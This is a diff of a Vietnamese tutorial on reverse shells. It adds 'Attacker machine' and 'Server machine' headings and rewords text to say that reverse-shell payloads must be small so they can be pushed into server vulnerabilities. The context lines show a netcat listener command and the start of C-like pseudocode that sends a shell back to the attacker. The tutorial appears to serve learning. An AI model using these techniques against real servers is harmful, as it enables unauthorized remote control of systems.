@@ -33,12 +33,16 @@ Attacker Machine -------- shell CLI -------> Server Machine
 <img width="438" height="178" alt="image" src="https://github.com/user-attachments/assets/a582c7ab-504a-4e78-8c19-ef2c0a0f2dae" />
 
 ### Ví dụ:
+**Attacker machine**
+
 Trước hết, lắng nghe trên máy mình: (attacker machine)
 ```c
 nc -lvp 4444
 ```
 
-Ta biểu diễn chương trình kết nối và gửi shell về máy chủ người dùng qua mã giả tựa C:
+**Server machine**
+
+Ta biểu diễn chương trình kết nối từ server và gửi shell về máy chủ người dùng qua mã giả tựa C:
 ```c
 #
 sock = socket();
@@ -96,7 +100,7 @@ int main(void) {
 }
 ```
 
-Vì reverse shell thường là 1 payload, nên kích cỡ file phải nhỏ.
+Vì reverse shell thường là 1 payload (có thể file, text,..) để đẩy vào bất kỳ lỗ hổng trên server, nên kích cỡ payload nên phải nhỏ.
 
 Code asm:
 
